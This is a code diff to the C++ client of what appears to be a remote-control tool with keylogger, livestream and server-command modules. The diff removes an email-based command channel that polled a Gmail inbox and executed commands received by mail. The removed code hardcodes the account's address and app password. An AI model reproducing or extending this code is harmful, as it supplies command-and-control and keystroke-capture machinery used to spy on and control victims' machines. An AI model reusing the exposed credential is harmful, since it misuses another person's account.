@@ -19,7 +19,6 @@
 #include "menu_display.h"
 #include "response_handler.h"
 #include "../core/livestream.h"
-#include "../core/mail_controller.h"
 #include "../core/keylogger.h"
 #include "../core/thread_manager.h"
 #include "../core/constants.h"
@@ -32,7 +31,6 @@ using namespace std;
 
 unique_ptr<ClientController> clientController;
 unique_ptr<ThreadManager> globalThreadManager;
-unique_ptr<MailController> mailController;
 unique_ptr<LivestreamClient> livestreamClient;
 unique_ptr<KeyloggerReceiver> keyloggerClient;
 unique_ptr<ResponseHandler> responseHandler;
@@ -45,102 +43,8 @@ string logFileName = (currPath / "client/client_log.txt").string();
 Logger logFile(logFileName);
 string serverIP;
 
-void initializeMailController()
-{
-	if (mailController)
-		return; // Already initialized
-
-	logFile.log("EMAIL", "Initializing email controller");
-
-	try
-	{
-		string email = "nightshade.demo@gmail.com";
-		string password = "okpflvaogyvhezei";
-		mailController = make_unique<MailController>(email, password, serverIP, 12345, *globalThreadManager);
-
-		mailController->setCommandCallback([](const string &command) -> string
-																			 {
-			logFile.log("EMAIL", "Command received via email: " + command);
-
-			if (clientController && clientController->isConnected())
-			{
-				if (responseHandler)
-				{
-					// Submit email command processing as a task
-					globalThreadManager->submitNetworkTask([command]() {
-						responseHandler->processCommand(command);
-					}, TaskPriority::HIGH);
-					return "Email command queued for processing";
-				}
-			}
-			return "Email command failed - not connected to server"; });
-
-		mailController->startBackgroundMonitoring(3);
-		logFile.log("EMAIL", "Email monitoring initialized successfully");
-	}
-	catch (const exception &e)
-	{
-		logFile.log("EMAIL", "Email controller initialization error: " + string(e.what()));
-	}
-}
-
 bool handleSpecialCommand(const string &command)
 {
-	if (command == "MAILSTATUS")
-	{
-		if (mailController)
-		{
-			string status = mailController->getStatus();
-			bool cmdEnabled = mailController->isMailCommandEnabled();
-
-			cout << "[Mail] Monitoring: " << status << endl;
-			cout << "[Mail] Command Processing: " << (cmdEnabled ? "ENABLED" : "DISABLED") << endl;
-			cout << "[Mail] Send email with subject: [Controller] <COMMAND>" << endl;
-			cout << "[Mail] Example: [Controller] PROCESS" << endl;
-
-			if (!cmdEnabled)
-			{
-				cout << "[Mail] Note: Commands will not be executed until ENABLEMAIL is used" << endl;
-			}
-		}
-		else
-		{
-			cout << "[Mail] Email controller not initialized!" << endl;
-		}
-		return true;
-	}
-
-	if (command == "ENABLEMAIL")
-	{
-		if (mailController)
-		{
-			mailController->enableMailCommand(true);
-			cout << "[Mail] Email command processing ENABLED" << endl;
-			cout << "[Mail] The system will now execute commands received via email" << endl;
-		}
-		else
-		{
-			cout << "[Mail] Email controller not initialized!" << endl;
-		}
-		return true;
-	}
-
-	if (command == "DISABLEMAIL")
-	{
-		if (mailController)
-		{
-			mailController->disableMailCommand();
-			cout << "[Mail] Email command processing DISABLED" << endl;
-			cout << "[Mail] The system will monitor emails but won't execute commands" << endl;
-			cout << "[Mail] Use ENABLEMAIL to re-enable command processing" << endl;
-		}
-		else
-		{
-			cout << "[Mail] Email controller not initialized!" << endl;
-		}
-		return true;
-	}
-
 	if (command == "KEYLOG")
 	{
 		if (keyloggerClient->isRunning())
@@ -319,9 +223,6 @@ int main()
 	// Initialize ResponseHandler with thread manager
 	responseHandler = make_unique<ResponseHandler>(*globalThreadManager, logFile, *clientController, *livestreamClient, currPath / "client");
 
-	// Initialize email controller using ThreadManager
-	initializeMailController();
-
 	clientRunning = true;
 	string command = "";
 
@@ -390,7 +291,7 @@ int main()
 
 	if (logFile.is_open())
 	{
-		logFile.log("MAIN", "Client shutdown complete - Triple-thread architecture");
+		logFile.log("MAIN", "Client shutdown complete");
 		logFile.close();
 	}
 
